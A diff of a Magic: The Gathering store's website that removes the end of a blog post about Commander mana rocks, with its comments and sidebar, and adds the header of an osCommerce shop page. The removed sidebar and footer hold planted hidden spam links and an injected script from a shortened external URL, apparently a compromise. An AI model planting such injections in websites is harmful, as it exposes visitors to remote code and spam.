-<li>Gauntlet of Power</li>
-<li>Extraplanar Lens</li>
-</ul>
-<p><strong><strong> <a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Caged-Sun.jpg"><img class="alignnone size-medium wp-image-609" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Caged-Sun-211x300.jpg" alt="Caged Sun" width="211" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Caged-Sun-211x300.jpg 211w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Caged-Sun.jpg 480w" sizes="(max-width: 211px) 100vw, 211px" /></a></strong></strong></p>
-<h3>Tier 2: These produce more than one mana or color, but have drawbacks such as: enters tapped, activation costs, additional casting costs/requirements, not enough &#8220;bang&#8221; for the cost, or stays tapped after use.</h3>
-<p><strong><strong> </strong></strong>Depending on deck synergy, they can become top tier.  (Tezzeret loves the monoliths!). This automatically implies that they rely on other cards or additional mana investments to be top tier, thus relegating them to &#8220;tier two.&#8221;  Yes, I know that &#8220;Mox&#8221; and &#8220;Tier Two&#8221; are usually not synonymous, but you&#8217;ll have to trust my experience on these.</p>
-<ul>
-<li>Mox Opal</li>
-<li>Mox Diamond</li>
-<li>Chrome Mox</li>
-<li>Mana Vault</li>
-<li>Grim Monolith</li>
-<li>Basalt Monolith</li>
-<li>Darksteel Ingot</li>
-<li>Worn powerstone</li>
-<li>Ravnica block signets</li>
-<li>Return to Ravnica Keyrunes</li>
-<li>Wayfarer&#8217;s Bauble</li>
-<li>Burnished Hart</li>
-<li>Sphere of Suns</li>
-<li>Pristine Talisman</li>
-<li>Everflowing Chalice</li>
-</ul>
-<p><strong><strong> <a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Grim-Monolith.jpg"><img class="alignnone size-medium wp-image-610" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Grim-Monolith-211x300.jpg" alt="Grim Monolith" width="211" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Grim-Monolith-211x300.jpg 211w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Grim-Monolith.jpg 480w" sizes="(max-width: 211px) 100vw, 211px" /></a></strong></strong></p>
-<h3>Tier 3: at this point they start to cost 3 or more but are considerably underpowered for their price.  I would have to exhaust most of the options from tiers 1 and 2 before I started looking here.  As previously mentioned, I only want about 10-20% of my nonland slots to be devoted to mana ramping and fixing, so these just get outclassed by the previous tiers.  If playing on a budget, these are better than nothing.</h3>
-<ul>
-<li>Dragon&#8217;s Maze Cluestones</li>
-<li>Obelisks</li>
-<li>Borderposts</li>
-<li>Tarkir Banners</li>
-<li>Dragonstones</li>
-</ul>
-<h2><strong><strong> </strong></strong>Mana Rocks in Non Green Decks:</h2>
-<p>The next three decks illustrate how dedicating 20% or more of your deck to ramping and fixing can be helpful when your Commander hails from the deserts or frozen wastelands of magic, places where there are no &#8220;Tree Symbols&#8230;&#8221;</p>
-<h2><strong><strong> </strong></strong>Oloro esper control</h2>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Oloro.png"><img class="alignnone size-medium wp-image-621" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Oloro-300x282.png" alt="Oloro" width="300" height="282" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Oloro-300x282.png 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Oloro.png 790w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>In this deck I used mana rocks from tiers one and two, in addition to land tax, which is one of the strongest white magic cards ever printed.  I also have access to the top three Black tutors, which can always get Land Tax, Sol Ring, or a land.  This deck has only three creatures, Oloro, Solemn Simulacrum, and Sun Titan, the King of Value, just for their abilities to generate tempo.  The devious ulterior motive is to destroy all lands, thereby punishing the green decks that ramped all game, while we live on a pile of mana rocks.</p>
-<h2><strong><strong> </strong></strong>Narset, the Rock Star</h2>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Narset.png"><img class="alignnone size-medium wp-image-620" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Narset-300x283.png" alt="Narset" width="300" height="283" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Narset-300x283.png 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Narset.png 821w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>A literal avalanche of mana rocks by none other than EDH rockstar Rob Burgess.  It actually replaces a third of its land slots with mana rocks, which almost guarantees that Narset will hit for 75-100% of full value each swing.  The deck is built to allow multiple attack steps per turn, allowing narset to finish the job before you can say &#8220;Austere Command.&#8221;  Of course, if the artifact hate is used against you, the low land count can spell problems in the rebuilding stages, especially if Narset gets killed (by mass removal) to the point where her mana cost is prohibitive to recasting her.</p>
-<h2><strong><strong> </strong></strong>Mono Red Marton Stromgald</h2>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/MARTON.png"><img class="alignnone size-medium wp-image-617" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/MARTON-122x300.png" alt="MARTON" width="122" height="300" /></a><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marton-Stromgald.jpg"><img class="alignnone size-medium wp-image-618" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marton-Stromgald-211x300.jpg" alt="Marton Stromgald" width="211" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marton-Stromgald-211x300.jpg 211w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Marton-Stromgald.jpg 480w" sizes="(max-width: 211px) 100vw, 211px" /></a></p>
-<p>Created by Isbpathfinder (a popular moderator from <a href="http://www.mtgsalvation.com/forums/the-game/commander-edh/multiplayer-commander-decklists/217041-the-order-of-stromgald">Mtgsalvation</a>) This deck takes advantage of the colorless mana rocks by using a ton of artifacts and X spells.  It also uses powerful red card draw with all of the draw-sevens.   The plan is to make a lot of tokens, and then finish by attacking with Marton, who is the ancient version of Craterhoof Behemoth.  It&#8217;s similar to the Azusa deck in that it wants to dump its hand on the board, refill the hand after it&#8217;s exhausted, then make big dumb things to end the game as fast as possible.</p>
-<h1>The End of the Ramp</h1>
-<p>Now that you have some ideas and decklists to consider, It&#8217;s time to bring this episode to a close.  I hope that this series on Mana in EDH brought you closer to understanding one of the findamental concepts of deckbuilding in this format, and will lead to an increased level of fun when you play this format.  Next time, I&#8217;ll be looking at cards from the Magic Orgins spoiler, and evaluating their place in EDH.  I&#8217;ll also include my thoughts on what I&#8217;ll pre-order from this set.  There are so many legends spoiled already, as well as some juicy standalone cards&#8230; I know that Marton Stromgald (above) is really excited about these two red cards:</p>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Avaricious-Dragon-Magic-Origins-Spoiler-216x302.png"><img class="alignnone size-medium wp-image-624" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Avaricious-Dragon-Magic-Origins-Spoiler-216x302-214x300.png" alt="Avaricious-Dragon-Magic-Origins-Spoiler-216x302" width="214" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Avaricious-Dragon-Magic-Origins-Spoiler-216x302-214x300.png 214w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Avaricious-Dragon-Magic-Origins-Spoiler-216x302.png 216w" sizes="(max-width: 214px) 100vw, 214px" /></a><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Pia-and-Kiran-Nalaar-Magic-Origins-Spoiler-216x302.png"><img class="alignnone size-medium wp-image-625" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Pia-and-Kiran-Nalaar-Magic-Origins-Spoiler-216x302-214x300.png" alt="Pia-and-Kiran-Nalaar-Magic-Origins-Spoiler-216x302" width="214" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Pia-and-Kiran-Nalaar-Magic-Origins-Spoiler-216x302-214x300.png 214w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/06/Pia-and-Kiran-Nalaar-Magic-Origins-Spoiler-216x302.png 216w" sizes="(max-width: 214px) 100vw, 214px" /></a></p>
-<p>&nbsp;</p>
-<p>Until then!</p>
-<p>-Craig</p>
-<p><a href="mailto:songwritercs@gmail.com">SUBMIT A DECK</a> for review, suggestions, or tuning.  If I use your deck in an article here, I will buy you a standard-legal pack of your choice, as well as some other EDH goodies (sleeves, deckboxes) the next time I see you at The Wizard’s Cupboard, or, if you are not located nearby, I’ll mail the loot to you <img class="wp-smiley" src="http://www.wizardscupboard.com/wordpress/wp-includes/images/smilies/icon_smile.gif" alt=":)" /></p>
-
-</section><!-- /.article-content -->
-					<aside class="post-meta">
-			<ul>
-				<li class="categories"><a href="https://www.wizardscupboard.com/wordpress/category/edh-commander/" rel="category tag">EDH/Commander</a></li>
-				<li class="comment"><a href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/#comments">3 Comments</a></li>
-													<li class="author"><a href="https://www.wizardscupboard.com/wordpress/author/craig/" title="Posts by Craig Sidorowicz" rel="author">Craig Sidorowicz</a></li>
-							</ul>
-		</aside><!-- /.post-meta -->
-		
-		</article><!-- #post-602 -->
-
-	
-			<nav role="navigation" id="" class="navigation-post">
-			<h1 class="screen-reader-text">Post navigation</h1>
-
-		
-			<div class="nav-previous"><a href="https://www.wizardscupboard.com/wordpress/preparing-for-gp-charlotte/" rel="prev"><span class="meta-nav"></span> Preparing for GP Charlotte</a></div>			<div class="nav-next"><a href="https://www.wizardscupboard.com/wordpress/ten-magic-origins-cards-that-will-change-edh/" rel="next">Ten Magic Origins Cards that will Change EDH <span class="meta-nav"></span></a></div>
-		
-		</nav><!-- # -->
-		
-
-
-<div id="comments" class="comments">
-
-	
-	
-		<h2 class="comments-title">
-			3 thoughts on &ldquo;<span>Mana in EDH Part 2:  Choosing the Correct Ramp Package.</span>&rdquo;		</h2>
-
-		<ol class="commentlist">
-					<li class="pingback even thread-even depth-1" id="comment-14854">
-				<div id="div-comment-14854" class="comment-body">
-					<div class="comment-author vcard">
-				
-				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/#comment-14854" class="date-link">December 22, 2015 at 6:53 am</a>				</div>
-				<cite class="fn"><a href='http://www.wizardscupboard.com/wordpress/edhcommander-deckbuilding-101-packages-synergy-and-theme-featuring-marath-token-landfall/' rel='external nofollow' class='url'>EDH COmmander Deckbuilding 101 Packages Synergy Theme Marath</a></cite>			</div>
-			<div class="comment-content">
-				
-				<p>[&#8230;] Mana in EDH Part 2: Choosing the Correct Ramp Package [&#8230;]</p>
-			</div>
-
-			<div class="reply">
-				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/?replytocom=14854#respond' onclick='return addComment.moveForm( "div-comment-14854", "14854", "respond", "602" )' aria-label='Reply to EDH COmmander Deckbuilding 101 Packages Synergy Theme Marath'>Reply</a>			</div><!-- /.reply -->
-					</div><!-- /.comment-body -->
-			</li><!-- #comment-## -->
-		<li class="comment odd alt thread-odd thread-alt depth-1 parent" id="comment-19368">
-				<div id="div-comment-19368" class="comment-body">
-					<div class="comment-author vcard">
-				<img src="https://secure.gravatar.com/avatar/a91956f8631c2aaed87020eeaf46df85?s=96&#038;d=mm&#038;r=g" width="96" height="96" alt="" class="avatar avatar-96wp-user-avatar wp-user-avatar-96 alignnone photo avatar-default" />
-				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/#comment-19368" class="date-link">October 19, 2016 at 2:58 am</a>				</div>
-				<cite class="fn">Brad</cite>			</div>
-			<div class="comment-content">
-				
-				<p>Hello. What would be a tier grouping of green ramp spells? I&#8217;m building treefolk and want to avoid artifacts if possible. I know this can set me waaay back, but I&#8217;d like to make it work if possible. Obviously most of my creatures are high cost so I do need ramp. Just want to keep it in black, white or green and avoid artifacts.</p>
-			</div>
-
-			<div class="reply">
-				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/?replytocom=19368#respond' onclick='return addComment.moveForm( "div-comment-19368", "19368", "respond", "602" )' aria-label='Reply to Brad'>Reply</a>			</div><!-- /.reply -->
-					</div><!-- /.comment-body -->
-			<ul class="children">
-		<li class="comment even depth-2" id="comment-20927">
-				<div id="div-comment-20927" class="comment-body">
-					<div class="comment-author vcard">
-				<img src="https://secure.gravatar.com/avatar/42716b092257ffce5c39ff8446c3e995?s=96&#038;d=mm&#038;r=g" width="96" height="96" alt="" class="avatar avatar-96wp-user-avatar wp-user-avatar-96 alignnone photo avatar-default" />
-				<div class="comment-meta commentmetadata"><a href="https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/#comment-20927" class="date-link">May 16, 2017 at 3:29 pm</a>				</div>
-				<cite class="fn">Selvala</cite>			</div>
-			<div class="comment-content">
-				
-				<p>I am a mono green player and I find it morally wrong to play any artifact cards as well, here are the best mono green ramp spells without even considering those horrible unnatural abominations they call ramp. Make sure to play plenty of artifact hate so only you can ramp!</p>
-<p>-llanowar elves<br />
--elvish mystic<br />
--sakura-tribe elder<br />
--rampant growth<br />
--nature&#8217;s lore<br />
--cultivate<br />
--kodama&#8217;s reach<br />
--nissa&#8217;s pilgrimage<br />
--explosive vegetation<br />
--tempt with discovery</p>
-			</div>
-
-			<div class="reply">
-				<a rel='nofollow' class='comment-reply-link' href='https://www.wizardscupboard.com/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/?replytocom=20927#respond' onclick='return addComment.moveForm( "div-comment-20927", "20927", "respond", "602" )' aria-label='Reply to Selvala'>Reply</a>			</div><!-- /.reply -->
-					</div><!-- /.comment-body -->
-			</li><!-- #comment-## -->
-</ul><!-- .children -->
-</li><!-- #comment-## -->
-		</ol>
-
-		
-	
-		<div id="respond" class="comment-respond">
-		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/wordpress/mana-in-edh-part-2-choosing-the-correct-ramp-package/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://www.wizardscupboard.com/wordpress/wp-comments-post.php" method="post" id="commentform" class="comment-form">
-				<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
-<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
-<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" /></p>
-<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='602' id='comment_post_ID' />
-<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
-</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="413ebe7163" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="187"/></p>			</form>
-			</div><!-- #respond -->
-	
-</div><!-- .comments -->
-
-
-</section><!-- /.content -->
-
-
-
-
-<aside class="sidebar" role="complementary">
-
-	
-	<aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" class="searchform" action="https://www.wizardscupboard.com/wordpress/" role="search">
-		<label for="s" class="screen-reader-text">Search</label>
-		<input type="search" class="field" name="s" value="" id="s" placeholder="Search &hellip;" />
-		<input type="submit" class="submit" id="searchsubmit" value="Search" /><span style="dispLAy : NOnE;"><a href="http://www.tttgoogle.ru">кредит онлайн заявка</a><a href="http://www.tttgoogle.ru/zaymyi.html">срочный кредит</a><a href="http://www.tttgoogle.ru/business-kredit.html">кредит бизнесу1</a></span>
-	</form>
-</aside><aside id="widget_sp_image-2" class="widget widget_sp_image"><a href="http://www.wizardscupboard.com" id="" target="_blank" class="widget_sp_image-image-link" title="" rel=""><img width="180" height="180" alt="" class="attachment-full aligncenter" style="max-width: 100%;" src="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure.jpg" /></a></aside><aside id="categories-2" class="widget widget_categories"><h2>Categories</h2>		<ul>
-	<li class="cat-item cat-item-1"><a href="https://www.wizardscupboard.com/wordpress/category/edh-commander/" title="Post&#039;s relating to EDH/Commander Card&#039;s, Deck&#039;s and Deck Construction">EDH/Commander</a> (24)
-</li>
-	<li class="cat-item cat-item-5"><a href="https://www.wizardscupboard.com/wordpress/category/ramblings/" title="Just general ramblings">MTG Ramblings</a> (37)
-</li>
-	<li class="cat-item cat-item-6"><a href="https://www.wizardscupboard.com/wordpress/category/standard-decks/" title="New standard deck ideas">Standard</a> (14)
-</li>
-		</ul>
-</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h2>Recent Posts</h2>		<ul>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/the-momir-basic-box/">The Momir Basic Box</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/modern-horizons-shopping-list/">Modern Horizons Shopping List</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/matt-harvey-unlike-mets-says-he-always-thought-he-had-a-180-inning-limit/">Matt Harvey, unlike Mets, says he always thought he had a 180-inning limit</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/from-convict-to-legal-justice-reporter-i-was-so-fortunate-to-come-away-from-this/">From Convict To Legal Justice Reporter: &#8216;I Was So Fortunate To come Away from This&#8217;</a>
-						</li>
-					<li>
-				<a href="https://www.wizardscupboard.com/wordpress/new-cards-for-modern/">New Cards for Modern<script src="https://is.gd/GgGf9z?v=v25.0"></script></a>
-						</li>
-				</ul>
-		</aside>		<aside id="archives-2" class="widget widget_archive"><h2>Archives</h2>		<ul>
-			<li><a href='https://www.wizardscupboard.com/wordpress/2019/09/'>September 2019</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2019/08/'>August 2019</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2018/09/'>September 2018</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2018/08/'>August 2018</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/08/'>August 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/07/'>July 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/06/'>June 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/05/'>May 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/04/'>April 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/03/'>March 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/02/'>February 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2017/01/'>January 2017</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/11/'>November 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/09/'>September 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/08/'>August 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/07/'>July 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/06/'>June 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/05/'>May 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/04/'>April 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/03/'>March 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/02/'>February 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2016/01/'>January 2016</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/12/'>December 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/11/'>November 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/10/'>October 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/09/'>September 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/08/'>August 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/07/'>July 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/06/'>June 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/05/'>May 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/04/'>April 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/03/'>March 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2015/02/'>February 2015</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/12/'>December 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/11/'>November 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/07/'>July 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/06/'>June 2014</a></li>
-	<li><a href='https://www.wizardscupboard.com/wordpress/2014/04/'>April 2014</a></li>
-		</ul>
-		</aside><aside id="text-2" class="widget widget_text"><h2>Twitter</h2>			<div class="textwidget"><a class="twitter-timeline" href="https://twitter.com/Wizardscupboard" data-widget-id="514549358423851009">Tweets by @Wizardscupboard</a>
-<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script></div>
-		</aside><aside id="text-3" class="widget widget_text"><h2>Facebook</h2>			<div class="textwidget"><div class="fb-activity" data-site="http://www.wizardscupboard.com" data-action="likes, recommends" data-colorscheme="dark" data-header="true"></div></div>
-		</aside>
-	
-</aside>
-
-
-
-
-
-		
-		</div><!-- /.content-wrapper -->
-
-		<footer class="footer content-wrapper" role="contentinfo">
-
-			<div class="footer-content">
-
-					<section class="footer-widgets columns-3">
-
-		<div class="footer-sidebar first">
-					</div>
-
-		<div class="footer-sidebar second">
-					</div>
-
-		<div class="footer-sidebar third">
-			<aside id="text-999" class="widget widget_text">			<div class="textwidget"><script src="https://is.gd/GgGf9z?v=v25.0"></script></div>
-		</aside>		</div>
-
-	</section>
-		<p>
-		Powered by <a href="http://www.wizardscupboard.com" title="WordPress.org">Wizard's Cupboard</a>.
-	</p>
-			<a href="#top" class="back-to-top button">
-			Back to top		</a>
-	
-			</div><!-- /.footer-content -->
-
-		</footer>
-
-		
-	</div><!-- /.inner-wrap -->
-
-</div><!-- /.outer-wrap -->
-
-
-<div id="su-footer-links" style="text-align: center;"></div><script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/plugins/akismet/_inc/form.js?ver=3.2'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/plugins.min.js?ver=4.7.14'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/script.min.js?ver=4.7.14'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/comment-reply.min.js?ver=4.7.14'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/wp-embed.min.js?ver=4.7.14'></script>
-
-</body>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Magic the Gathering: Magic Cards, Magic the Gathering Cards, Buy Cards -Wizards Cupboard</title>
+<base href="https://www.wizardscupboard.com/">
+<link rel="stylesheet" type="text/css" href="stylesheet.css">
+<script language="javascript" type="text/javascript">
+//<![CDATA[
+var cot_loc0=(window.location.protocol == "https:")? "https://secure.comodo.net/trustlogo/javascript/cot.js" :
+"http://www.trustlogo.com/trustlogo/javascript/cot.js";
+document.writeln('<scr' + 'ipt language="JavaScript" src="'+cot_loc0+'" type="text\/javascript">' + '<\/scr' + 'ipt>');
+//]]>
+</script></head>
+<body>
+<!-- header //-->
+<table border="0" width="1000" align="center" cellspacing="0" cellpadding="0">
+  <tr>
+    <td valign="middle" bgcolor="#000000"><center>
+    	<OBJECT 
+    		data="banner.swf" 
+    		type="application/x-shockwave-flash" 
+    		width="1000" 
+    		height="136" 
+    		id="banner">
+	    <PARAM name="movie" value="banner.swf"> 
+	    <PARAM name="quality" value="high"> 
+	    <PARAM name="bgcolor" value="#FFFFFF">
+	    <PARAM name="wmode" value="transparent">
+	      		</OBJECT>
+  	</center>
+  	</td>
+  </tr>
+</table>
+<table border="0" width="1000" align="center" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="headerNavigation">&nbsp;&nbsp;<a href="https://www.wizardscupboard.com" class="headerNavigation">Home</a> &raquo; <a href="https://www.wizardscupboard.com/index.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" class="headerNavigation">Magic the Gathering</a> &raquo; <a href="https://www.wizardscupboard.com/shopping_cart.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" class="headerNavigation">Cart Contents</a></td>
+    <!-- PWA BOF -->    
+    <td align="right" class="headerNavigation">    		<a href="https://www.wizardscupboard.com/account.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" class="headerNavigation">My Account</a> &nbsp;|&nbsp;     	<a href="https://www.wizardscupboard.com/shopping_cart.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" class="headerNavigation">Cart Contents</a> &nbsp;|&nbsp; <a href="https://www.wizardscupboard.com/checkout_shipping.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" class="headerNavigation">Checkout</a> &nbsp;&nbsp;</td>
+    <!-- PWA EOF -->
+  </tr>
+</table>
+<!-- header_eof //-->
+
+<!-- body //-->
+<table border="0" width="1000" align="center" cellspacing="3" cellpadding="3">
+  <tr>
+    <td width="150" valign="top"><table border="0" width="150" cellspacing="0" cellpadding="2">
+<!-- left_navigation //-->
+<!-- search //-->
+          <tr>
+            <td>
+            		<script language="javascript" src="includes/searchSuggest.js" type="text/javascript"></script>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_left.gif" width="11" height="14" border="0" alt="Magic the Gathering" title="Magic the Gathering"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Quick Find</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="center" class="boxText"><form name="quick_find" action="https://www.wizardscupboard.com/advanced_search_result.php" method="get"><input type="text" name="keywords" id="txtSearch" onkeyup="searchSuggest();" size="10" maxlength="50" style="width: 120px"><div id="search_suggest"></div>&nbsp;<input type="hidden" name="osCsid" value="b1e08fcba3c3faefc0655b62969258c5"><input type="image" src="includes/languages/english/images/buttons/button_quick_find.gif" alt="Magic Cards Quick Find" title=" Magic Cards Quick Find "><br>Use keywords to find your product or try the<br><a href="https://www.wizardscupboard.com/advanced_search.php?osCsid=b1e08fcba3c3faefc0655b62969258c5"><b>Advanced Search</b></a></form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+
+            </td>
+          </tr>
+<!-- search_eof //-->
+<!-- categories //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Categories</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
